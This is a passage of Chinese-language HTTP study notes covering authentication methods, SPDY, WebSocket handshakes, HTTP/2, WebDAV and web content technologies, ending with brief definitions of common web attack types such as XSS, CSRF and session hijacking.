<strong>HTTP</strong> 要慢 <strong>2</strong> 到 <strong>100</strong> 倍</li></ul><h2 id="确认访问用户身份的认证"><a href="#确认访问用户身份的认证" class="headerlink" title="确认访问用户身份的认证"></a>确认访问用户身份的认证</h2><p>某些 Web 页面只想让特定的人浏览</p><h3 id="何为认证"><a href="#何为认证" class="headerlink" title="何为认证"></a>何为认证</h3><p>为了弄清究竟是谁在访问服务 器，就得让对方的客户端自报家门。</p><h4 id="HTTP-1-1-使用的认证方式"><a href="#HTTP-1-1-使用的认证方式" class="headerlink" title="HTTP/1.1 使用的认证方式"></a>HTTP/1.1 使用的认证方式</h4><ul><li><strong>BASIC</strong> 认证（基本认证）</li><li><strong>DIGEST</strong> 认证（摘要认证）</li><li><strong>SSL</strong> 客户端认证</li><li><strong>FormBase</strong> 认证（基于表单认证）</li><li>Windows 统一认证（Keberos 认证、NTLM 认证）</li></ul><h3 id="BASIC-认证（基本认证）"><a href="#BASIC-认证（基本认证）" class="headerlink" title="BASIC 认证（基本认证）"></a><strong>BASIC</strong> 认证（基本认证）</h3><p><img src="https://z3.ax1x.com/2021/04/23/cOMKtf.png" alt="cOMKtf.png"></p><p>BASIC 认证虽然采用 Base64 编码方式，但这不是加密处理。不需要任何附加信息即可对其解码。换言之，在HTTP这种非加密信道通信就会被截获。</p><h3 id="DIGEST-认证（摘要认证）"><a href="#DIGEST-认证（摘要认证）" class="headerlink" title="DIGEST 认证（摘要认证）"></a><strong>DIGEST</strong> 认证（摘要认证）</h3><p>DIGEST 认证同样使用质询 / 响应的方式</p><p>所谓质询响应方式是指，一开始一方会先发送认证要求给另一方，接着使用从另一方那接收到的质询码计算生成响应码。最后将响应码返回给对方进行认证的方式。</p><p><img src="https://z3.ax1x.com/2021/04/23/cOMl9S.png" alt="cOMl9S.png"></p><p>DIGEST 认证提供防止密码被窃听的保护机制，但并不存在防止用户伪装的保护机制。</p><h3 id="SSL-客户端认证"><a href="#SSL-客户端认证" class="headerlink" title="SSL 客户端认证"></a><strong>SSL</strong> 客户端认证</h3><p>SSL 客户端认证是借由 HTTPS 的客户端证书完成认证的方式。凭借客户端证书认证，服务器可确认访问是否来自已登录的客户端。</p><h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><p>步骤 <strong>1</strong>： 接收到需要认证资源的请求，服务器会发送 Certificate Request 报文，要求客户端提供客户端证书。</p><p>步骤 <strong>2</strong>： 用户选择将发送的客户端证书后，客户端会把客户端证书信息以 Client Certificate 报文方式发送给服务器。</p><p>步骤 <strong>3</strong>： 服务器验证客户端证书验证通过后方可领取证书内客户端的公开密钥，然后开始 HTTPS 加密通信。</p><h4 id="SSL-客户端认证采用双因素认证"><a href="#SSL-客户端认证采用双因素认证" class="headerlink" title="SSL 客户端认证采用双因素认证"></a><strong>SSL</strong> 客户端认证采用双因素认证</h4><p>在多数情况下，SSL 客户端认证不会仅依靠证书完成认证，一般会和基于表单认证组合形成一种双因素认证（Two-factor authentication）来使用。换言之，第一个认证因素的 SSL 客户端证书用来认证客户端计算机， 另一个认证因素的密码则用来确定这是用户本人的行为。</p><h4 id="SSL-客户端认证必要的费用（证书）"><a href="#SSL-客户端认证必要的费用（证书）" class="headerlink" title="SSL 客户端认证必要的费用（证书）"></a><strong>SSL</strong> 客户端认证必要的费用（证书）</h4><h3 id="基于表单认证"><a href="#基于表单认证" class="headerlink" title="基于表单认证"></a>基于表单认证</h3><p>客户端会向服务器上的 Web 应用程序发送登录信息（Credential），按登录信息的验证结果认证。</p><h5 id="认证多半为基于表单认证"><a href="#认证多半为基于表单认证" class="headerlink" title="认证多半为基于表单认证"></a>认证多半为基于表单认证</h5><p><strong>Session</strong> 管理及 <strong>Cookie</strong> 应用</p><p><img src="https://z3.ax1x.com/2021/04/23/cOM11g.png" alt="cOM11g.png"></p><h2 id="基于-HTTP-的功能追加协议"><a href="#基于-HTTP-的功能追加协议" class="headerlink" title="基于 HTTP 的功能追加协议"></a>基于 <strong>HTTP</strong> 的功能追加协议</h2><h4 id="基于-HTTP-的协议"><a href="#基于-HTTP-的协议" class="headerlink" title="基于 HTTP 的协议"></a>基于 <strong>HTTP</strong> 的协议</h4><h4 id="消除-HTTP-瓶颈的-SPDY"><a href="#消除-HTTP-瓶颈的-SPDY" class="headerlink" title="消除 HTTP 瓶颈的 SPDY"></a>消除 <strong>HTTP</strong> 瓶颈的 <strong>SPDY</strong></h4><h5 id="HTTP-瓶颈"><a href="#HTTP-瓶颈" class="headerlink" title="HTTP 瓶颈"></a><strong>HTTP</strong> 瓶颈</h5><p><img src="https://z3.ax1x.com/2021/04/23/cOM3cQ.png" alt="cOM3cQ.png"></p><ul><li><p>Ajax解决</p><p><img src="https://z3.ax1x.com/2021/04/23/cOM8Xj.png" alt="cOM8Xj.png"></p></li><li><p><strong>Comet</strong> 解决</p><p><img src="https://z3.ax1x.com/2021/04/23/cOMJns.png" alt="cOMJns.png"></p></li><li><p>消除 <strong>HTTP</strong> 瓶颈的 <strong>SPDY</strong></p></li></ul><h4 id="SPDY-的设计与功能"><a href="#SPDY-的设计与功能" class="headerlink" title="SPDY 的设计与功能"></a><strong>SPDY</strong> 的设计与功能</h4><p>SPDY 没有完全改写 HTTP 协议，而是在 TCP/IP 的应用层与运输层之间通过新加会话层的形式运作。同时，考虑到安全性问题，SPDY 规定通信中使用 SSL。</p><p>SPDY 以会话层的形式加入，控制对数据的流动，但还是采用 HTTP 建立通信连接。因此，可照常使用 HTTP 的 GET 和 POST 等方 法、Cookie 以及 HTTP 报文等。</p><p><img src="https://z3.ax1x.com/2021/04/23/cOMYBn.png" alt="cOMYBn.png"></p><h5 id="新功能"><a href="#新功能" class="headerlink" title="新功能"></a>新功能</h5><ul><li>多路复用流</li><li>赋予请求优先级</li><li>压缩 <strong>HTTP</strong> 首部</li><li>推送功能</li><li>服务器提示功能</li></ul><h4 id="SPDY-大体上消除了-Web-瓶颈"><a href="#SPDY-大体上消除了-Web-瓶颈" class="headerlink" title="SPDY 大体上消除了 Web 瓶颈"></a><strong>SPDY</strong> 大体上消除了 <strong>Web</strong> 瓶颈</h4><h3 id="使用浏览器进行全双工通信的WebSocket"><a href="#使用浏览器进行全双工通信的WebSocket" class="headerlink" title="使用浏览器进行全双工通信的WebSocket"></a>使用浏览器进行全双工通信的<strong>WebSocket</strong></h3><p>WebSocket 网络技术正是为解决这些问题而实现的一套新协议及 API。</p><p> WebSocket 技术主要是为了解决 Ajax 和 Comet 里 XMLHttpRequest 附带的缺陷所引起的问题。</p><h4 id="WebSocket-协议"><a href="#WebSocket-协议" class="headerlink" title="WebSocket 协议"></a>WebSocket 协议</h4><p>一旦 Web 服务器与客户端之间建立起 WebSocket 协议的通信连接， 之后所有的通信都依靠这个专用协议进行。通信过程中可互相发送JSON、XML、HTML 或图片等任意格式的数据。</p><p>由于是建立在 HTTP 基础上的协议，因此连接的发起方仍是客户端， 而一旦确立 WebSocket 通信连接，不论服务器还是客户端，任意一方都可直接向对方发送报文。</p><h5 id="新特点"><a href="#新特点" class="headerlink" title="新特点"></a>新特点</h5><ul><li>推送功能</li><li>减少通信量</li></ul><h4 id="实现-WebSocket-通信"><a href="#实现-WebSocket-通信" class="headerlink" title="实现 WebSocket 通信"></a>实现 WebSocket 通信</h4><p>完成一次握手</p><h5 id="握手请求"><a href="#握手请求" class="headerlink" title="握手请求"></a>握手请求</h5><pre class=" language-http"><code class="language-http">GET /chat  HTTP/1.1 <span class="token header-name keyword">Host:</span> server.example.com <span class="token header-name keyword">Upgrade:</span> websocket Connection: Upgrade<span class="token header-name keyword">Sec-WebSocket-Key:</span> dGhlIHNhbXBsZSBub25jZQ== <span class="token header-name keyword">Origin:</span> http://example.com<span class="token header-name keyword">Sec-WebSocket-Protocol:</span> chat, superchat <span class="token header-name keyword">Sec-WebSocket-Version:</span> 13</code></pre><p>用到 HTTP 的 Upgrade 首部字段，告知服务器通信协议发生改变。</p><p>Sec-WebSocket-Key 字段内记录着握手过程中必不可少的键值。Sec-WebSocket-Protocol 字段内记录使用的子协议。</p><h5 id="握手响应"><a href="#握手响应" class="headerlink" title="握手响应"></a>握手响应</h5><pre class=" language-http"><code class="language-http"><span class="token response-status">HTTP/1.1 <span class="token property">101 Switching Protocols</span></span><span class="token header-name keyword">Upgrade:</span> websocket <span class="token header-name keyword">Connection:</span> Upgrade<span class="token header-name keyword">Sec-WebSocket-Accept:</span> s3pPLMBiTxaQ9kYGzzhZRbK+xOo= <span class="token header-name keyword">Sec-WebSocket-Protocol:</span> chat</code></pre><p>Sec-WebSocket-Accept 的字段值是由握手请求中的 Sec-WebSocket-Key 的字段值生成的。</p><p><img src="https://z3.ax1x.com/2021/04/23/cOMt7q.png" alt="cOMt7q.png"></p><h4 id="WebSocket-API"><a href="#WebSocket-API" class="headerlink" title="WebSocket API"></a>WebSocket API</h4><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> socket <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSocket</span><span class="token punctuation">(</span>'ws<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>game<span class="token punctuation">.</span>example<span class="token punctuation">.</span>com<span class="token punctuation">:</span><span class="token number">12010</span><span class="token operator">/</span> socket<span class="token punctuation">.</span>onopen <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>socket<span class="token punctuation">.</span>bufferedAmount <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> socket<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token function">getUpdateData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">;</span></code></pre><h3 id="HTTP-2-0"><a href="#HTTP-2-0" class="headerlink" title="HTTP/2.0"></a>HTTP/2.0</h3><h4 id="HTTP-2-0特点"><a href="#HTTP-2-0特点" class="headerlink" title="HTTP/2.0特点"></a>HTTP/2.0特点</h4><table><thead><tr><th>压缩</th><th><strong>SPDY</strong>、<strong>Friendly</strong></th></tr></thead><tbody><tr><td>多路复用</td><td>SPDY</td></tr><tr><td>TLS 义务化</td><td>Speed＋ Mobility</td></tr><tr><td>协商</td><td>Speed＋ Mobility，Friendly</td></tr><tr><td>客户端拉曳（Client Pull）/服务器推送  （Server Push）</td><td>Speed＋ Mobility</td></tr><tr><td>流量控制</td><td>SPDY</td></tr><tr><td>WebSocket</td><td>Speed＋ Mobility</td></tr></tbody></table><p>注：HTTP Speed ＋ Mobility 简写为 Speed ＋ Mobility，Network-Friendly HTTP Upgrade 简写为 Friendly。</p><h3 id="Web-服务器管理文件的-WebDAV"><a href="#Web-服务器管理文件的-WebDAV" class="headerlink" title="Web 服务器管理文件的 WebDAV"></a><strong>Web</strong> 服务器管理文件的 <strong>WebDAV</strong></h3><p>WebDAV（Web-based Distributed Authoring and Versioning，基于万维网的分布式创作和版本控制）是一个可对 Web 服务器上的内容直接进行文件复制、编辑等操作的分布式文件系统。它作为扩展 HTTP/1.1 的协议定义在 RFC4918。</p><p>除了创建、删除文件等基本功能，它还具备文件创建者管理、文件编辑过程中禁止其他用户内容覆盖的加锁功能，以及对文件内容修改的版本控制功能。</p><h4 id="扩展-HTTP-1-1-的-WebDAV"><a href="#扩展-HTTP-1-1-的-WebDAV" class="headerlink" title="扩展 HTTP/1.1 的 WebDAV"></a>扩展 <strong>HTTP/1.1</strong> 的 <strong>WebDAV</strong></h4><p><img src="https://z3.ax1x.com/2021/04/23/cOMUA0.png" alt="cOMUA0.png"></p><p>集合（<strong>Collection</strong>）：是一种统一管理多个资源的概念。以集合为单位可进行各种操作。也可实现类似集合的集合这样的叠加。</p><p>资源（<strong>Resource</strong>）：把文件或集合称为资源。</p><p>属性（<strong>Property</strong>）：定义资源的属性。定义以<strong>“</strong>名称 <strong>=</strong> 值<strong>”</strong>的格式执行。</p><p>锁（<strong>Lock</strong>）：把文件设置成无法编辑状态。多人同时编辑时，可防止在同一时间进行内容写入。</p><h4 id="WebDAV-内新增的方法及状态码"><a href="#WebDAV-内新增的方法及状态码" class="headerlink" title="WebDAV 内新增的方法及状态码"></a><strong>WebDAV</strong> 内新增的方法及状态码</h4><p>WebDAV 为实现远程文件管理，向 HTTP/1.1 中追加了以下这些方法。</p><p><strong>PROPFIND</strong> ：获取属性</p><p><strong>PROPPATCH</strong> ：修改属性</p><p><strong>MKCOL</strong> ：创建集合</p><p><strong>COPY</strong> ：复制资源及属性</p><p><strong>MOVE</strong> ：移动资源</p><p><strong>LOCK</strong> ：资源加锁</p><p><strong>UNLOCK</strong> ：资源解锁</p><p>为配合扩展的方法，状态码也随之扩展。</p><p><strong>102 Processing</strong> ：可正常处理请求，但目前是处理中状态</p><p><strong>207 Multi-Status</strong> ：存在多种状态</p><p><strong>422 Unprocessible Entity</strong> ：格式正确，内容有误</p><p><strong>423 Locked</strong> ：资源已被加锁</p><p><strong>424 Failed Dependency</strong> ：处理与某请求关联的请求失败，因此不再维持依赖关系</p><p><strong>507 Isufficient Storage</strong> ：保存空间不足</p><ul><li><p><strong>WebDAV</strong> 的请求实例</p><p>下面是使用 PROPFIND 方法对 <a href="http://www.example.com/file">http://www.example.com/file </a>发起获取属性的请求。</p><pre class=" language-http"><code class="language-http">PROPFIND /file HTTP/1.1<span class="token header-name keyword">Host:</span> www.example.com<span class="token header-name keyword">Content-Type:</span> application/xml; charset="utf-8" Content-Length: 219<span class="token application/xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">D:</span>propfind</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>D</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>DAV:<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">D:</span>prop</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>R</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://ns.example.com/boxschema/<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">R:</span>bigbox</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">R:</span>author</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">R:</span>DingALing</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">R:</span>Random</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">D:</span>prop</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">D:</span>propfind</span><span class="token punctuation">></span></span></span></code></pre></li><li><p><strong>WebDAV</strong> 的响应实例</p><p>下面是针对之前的 PROPFIND 方法，返回<a href="http://www.example.com/file">http://www.example.com/file </a>的属性的响应。</p><pre class=" language-http"><code class="language-http"><span class="token response-status">HTTP/1.1 <span class="token property">207 Multi-Status</span></span><span class="token header-name keyword">Content-Type:</span> application/xml; charset="utf-8" Content-Length: 831<span class="token application/xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">D:</span>multistatus</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>D</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>DAV:<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">D:</span>response</span> <span class="token attr-name"><span class="token namespace">xmlns:</span>R</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://ns.example.com/boxschema/<span class="token punctuation">"</span></span><span class="token attr-name"><span class="token namespace">&lt;D:</span>href</span><span class="token punctuation">></span></span>http://www.example.com/file<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">D:</span>href</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">D:</span>propstat</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">D:</span>prop</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">R:</span>bigbox</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">R:</span>BoxType</span><span class="token punctuation">></span></span>Box type A<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">R:</span>BoxType</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">R:</span>bigbox</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">R:</span>author</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">R:</span>Name</span><span class="token punctuation">></span></span>J.J. Johnson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">R:</span>Name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">R:</span>author</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">D:</span>prop</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">D:</span>status</span><span class="token punctuation">></span></span>HTTP/1.1 200 OK<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">D:</span>status</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">D:</span>propstat</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">D:</span>propstat</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">D:</span>prop</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">R:</span>DingALing</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">R:</span>Random</span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">D:</span>prop</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">D:</span>status</span><span class="token punctuation">></span></span>HTTP/1.1 403 Forbidden<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">D:</span>status</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">D:</span>responsedescription</span><span class="token punctuation">></span></span> The user does not have acc<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">D:</span>responsedescription</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">D:</span>propstat</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">D:</span>response</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">D:</span>responsedescription</span><span class="token punctuation">></span></span> There has been an access viola<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">D:</span>responsedescription</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">D:</span>multistatus</span><span class="token punctuation">></span></span></span></code></pre></li></ul><h2 id="构建-Web-内容的技术"><a href="#构建-Web-内容的技术" class="headerlink" title="构建 Web 内容的技术"></a>构建 <strong>Web</strong> 内容的技术</h2><h3 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h3><h5 id="Web-页面几乎全由-HTML-构建"><a href="#Web-页面几乎全由-HTML-构建" class="headerlink" title="Web 页面几乎全由 HTML 构建"></a><strong>Web</strong> 页面几乎全由 <strong>HTML</strong> 构建</h5><h5 id="HTML版本"><a href="#HTML版本" class="headerlink" title="HTML版本"></a>HTML版本</h5><h5 id="设计应用-CSS"><a href="#设计应用-CSS" class="headerlink" title="设计应用 CSS"></a>设计应用 <strong>CSS</strong></h5><h4 id="动态HTML"><a href="#动态HTML" class="headerlink" title="动态HTML"></a>动态HTML</h4><p>使用客户端脚本语言将静态的 HTML 内容变成动态的技术的总称。</p><h5 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h5><p>DOM 是用以操作 HTML 文档和 XML 文档的 API（Application Programming Interface，应用编程接口）。</p><p>Web应用</p><h4 id="通过-Web-提供功能的-Web-应用"><a href="#通过-Web-提供功能的-Web-应用" class="headerlink" title="通过 Web 提供功能的 Web 应用"></a>通过 <strong>Web</strong> 提供功能的 <strong>Web</strong> 应用</h4><p>由程序创建的内容称为动态内容，而事先准备好的内容称为静态内容。</p><h4 id="与-Web-服务器及程序协作的-CGI"><a href="#与-Web-服务器及程序协作的-CGI" class="headerlink" title="与 Web 服务器及程序协作的 CGI"></a>与 <strong>Web</strong> 服务器及程序协作的 <strong>CGI</strong></h4><p>CGI（Common Gateway Interface，通用网关接口）是指 Web 服务器在接收到客户端发送过来的请求后转发给程序的一组机制。在 CGI 的作用下，程序会对请求内容做出相应的动作，比如创建 HTML 等动态内容。</p><p>使用 CGI 的程序叫做 CGI 程序，通常是用 Perl、PHP、Ruby 和 C 等编程语言编写而成。</p><h4 id="因-Java-而普及的-Servlet"><a href="#因-Java-而普及的-Servlet" class="headerlink" title="因 Java 而普及的 Servlet"></a>因 <strong>Java</strong> 而普及的 <strong>Servlet</strong></h4><p>Servlet 是一种能在服务器上创建动态内容的程序。Servlet 是用 Java 语言实现的一个接口，属于面向企业级 Java（JavaEE，Java Enterprise Edition）的一部分。负载小。</p><h3 id="数据发布的格式及语言"><a href="#数据发布的格式及语言" class="headerlink" title="数据发布的格式及语言"></a>数据发布的格式及语言</h3><h4 id="可扩展标记语言"><a href="#可扩展标记语言" class="headerlink" title="可扩展标记语言"></a>可扩展标记语言</h4><p>XML（eXtensible Markup Language，可扩展标记语言）是一种可按应用目标进行扩展的通用标记语言。旨在通过使用 XML，使互联网数据共享变得更容易。</p><p>XML 和 HTML 都是从标准通用标记语言 SGML（Standard Generalized Markup Language）简化而成。与 HTML 相比，它对数据的记录方式做了特殊处理。</p><h4 id="发布更新信息的-RSS-Atom"><a href="#发布更新信息的-RSS-Atom" class="headerlink" title="发布更新信息的 RSS/Atom"></a>发布更新信息的 <strong>RSS/Atom</strong></h4><p>RSS（简易信息聚合，也叫聚合内容）和 Atom 都是发布新闻或博客日志等更新信息文档的格式的总称。两者都用到了 XML。</p><h4 id="JavaScript-衍生的轻量级易用-JSON"><a href="#JavaScript-衍生的轻量级易用-JSON" class="headerlink" title="JavaScript 衍生的轻量级易用 JSON"></a><strong>JavaScript</strong> 衍生的轻量级易用 <strong>JSON</strong></h4><p>JSON（JavaScript Object Notation）是一种以JavaScript（ECMAScript）的对象表示法为基础的轻量级数据标记语言。</p><h2 id="Web-的攻击技术"><a href="#Web-的攻击技术" class="headerlink" title="Web 的攻击技术"></a><strong>Web</strong> 的攻击技术</h2><h3 id="针对-Web-的攻击技术"><a href="#针对-Web-的攻击技术" class="headerlink" title="针对 Web 的攻击技术"></a>针对 <strong>Web</strong> 的攻击技术</h3><h4 id="HTTP-不具备必要的安全功能"><a href="#HTTP-不具备必要的安全功能" class="headerlink" title="HTTP 不具备必要的安全功能"></a><strong>HTTP</strong> 不具备必要的安全功能</h4><h4 id="在客户端即可篡改请求"><a href="#在客户端即可篡改请求" class="headerlink" title="在客户端即可篡改请求"></a>在客户端即可篡改请求</h4><h4 id="针对-Web-应用的攻击模式"><a href="#针对-Web-应用的攻击模式" class="headerlink" title="针对 Web 应用的攻击模式"></a>针对 <strong>Web</strong> 应用的攻击模式</h4><ul><li>主动攻击</li><li>被动攻击</li><li>以服务器为目标的主动攻击</li><li>以服务器为目标的被动攻</li></ul><h3 id="因输出值转义不完全引发的安全漏洞"><a href="#因输出值转义不完全引发的安全漏洞" class="headerlink" title="因输出值转义不完全引发的安全漏洞"></a>因输出值转义不完全引发的安全漏洞</h3><ul><li>客户端的验证</li><li><strong>Web</strong> 应用端（服务器端）的验证<ul><li>输入值验证</li><li>输出值转义</li></ul></li></ul><h4 id="跨站脚本攻击（Cross-Site-Scripting，XSS）"><a href="#跨站脚本攻击（Cross-Site-Scripting，XSS）" class="headerlink" title="跨站脚本攻击（Cross-Site Scripting，XSS）"></a>跨站脚本攻击（Cross-Site Scripting，XSS）</h4><p>跨站脚本攻击（Cross-Site Scripting，XSS）是指通过存在安全漏洞的Web 网站注册用户的浏览器内运行非法的 HTML 标签或 JavaScript 进行的一种攻击。</p><h4 id="SQL-注入（SQL-Injection）"><a href="#SQL-注入（SQL-Injection）" class="headerlink" title="SQL 注入（SQL Injection）"></a>SQL 注入（SQL Injection）</h4><h4 id="OS-命令注入攻击（OS-Command-Injection）"><a href="#OS-命令注入攻击（OS-Command-Injection）" class="headerlink" title="OS 命令注入攻击（OS Command Injection）"></a>OS 命令注入攻击（OS Command Injection）</h4><h4 id="HTTP-首部注入攻击（HTTP-Header-Injection）"><a href="#HTTP-首部注入攻击（HTTP-Header-Injection）" class="headerlink" title="HTTP 首部注入攻击（HTTP Header Injection）"></a>HTTP 首部注入攻击（HTTP Header Injection）</h4><h4 id="邮件首部注入（Mail-Header-Injection）"><a href="#邮件首部注入（Mail-Header-Injection）" class="headerlink" title="邮件首部注入（Mail Header Injection）"></a>邮件首部注入（Mail Header Injection）</h4><h4 id="目录遍历（Directory-Traversal）攻击"><a href="#目录遍历（Directory-Traversal）攻击" class="headerlink" title="目录遍历（Directory Traversal）攻击"></a>目录遍历（Directory Traversal）攻击</h4><h4 id="远程文件包含漏洞（Remote-File-Inclusion）"><a href="#远程文件包含漏洞（Remote-File-Inclusion）" class="headerlink" title="远程文件包含漏洞（Remote File Inclusion）"></a>远程文件包含漏洞（Remote File Inclusion）</h4><h3 id="因设置或设计上的缺陷引发的安全漏洞"><a href="#因设置或设计上的缺陷引发的安全漏洞" class="headerlink" title="因设置或设计上的缺陷引发的安全漏洞"></a>因设置或设计上的缺陷引发的安全漏洞</h3><h4 id="强制浏览（Forced-Browsing）"><a href="#强制浏览（Forced-Browsing）" class="headerlink" title="强制浏览（Forced Browsing）"></a>强制浏览（Forced Browsing）</h4><p>强制浏览（Forced Browsing）安全漏洞是指，从安置在 Web 服务器的公开目录下的文件中，浏览那些原本非自愿公开的文件。</p><h4 id="不正确的错误消息处理（Error-Handling-Vulnerability）"><a href="#不正确的错误消息处理（Error-Handling-Vulnerability）" class="headerlink" title="不正确的错误消息处理（Error Handling Vulnerability）"></a>不正确的错误消息处理（Error Handling Vulnerability）</h4><p>不正确的错误消息处理（Error Handling Vulnerability）的安全漏洞是指，Web 应用的错误信息内包含对攻击者有用的信息。</p><h4 id="开放重定向（Open-Redirect）"><a href="#开放重定向（Open-Redirect）" class="headerlink" title="开放重定向（Open Redirect）"></a>开放重定向（Open Redirect）</h4><p>开放重定向（Open Redirect）是一种对指定的任意 URL 作重定向跳转的功能。而于此功能相关联的安全漏洞是指，假如指定的重定向 URL 到某个具有恶意的 Web 网站，那么用户就会被诱导至那个 Web 网站。</p><h3 id="因会话管理疏忽引发的安全漏洞"><a href="#因会话管理疏忽引发的安全漏洞" class="headerlink" title="因会话管理疏忽引发的安全漏洞"></a>因会话管理疏忽引发的安全漏洞</h3><h4 id="会话劫持（Session-Hijack）"><a href="#会话劫持（Session-Hijack）" class="headerlink" title="会话劫持（Session Hijack）"></a>会话劫持（Session Hijack）</h4><p>会话劫持（Session Hijack）是指攻击者通过某种手段拿到了用户的会话 ID，并非法使用此会话 ID 伪装成用户，达到攻击的目的。</p><h4 id="会话固定攻击"><a href="#会话固定攻击" class="headerlink" title="会话固定攻击"></a>会话固定攻击</h4><p>对以窃取目标会话 ID 为主动攻击手段的会话劫持而言，会话固定攻击（Session Fixation）攻击会强制用户使用攻击者指定的会话 ID，属于被动攻击。</p><h4 id="跨站点请求伪造（Cross-Site-Request-Forgeries，CSRF）"><a href="#跨站点请求伪造（Cross-Site-Request-Forgeries，CSRF）" class="headerlink" title="跨站点请求伪造（Cross-Site Request Forgeries，CSRF）"></a>跨站点请求伪造（Cross-Site Request Forgeries，CSRF）</h4><p>跨站点请求伪造（Cross-Site Request Forgeries，CSRF）攻击是指攻击者通过设置好的陷阱，强制对已完成认证的用户进行非预期的个人信息或设定信息等某些状态更新，属于被动攻击。</p><h3 id="其他安全漏洞"><a href="#其他安全漏洞" class="headerlink" 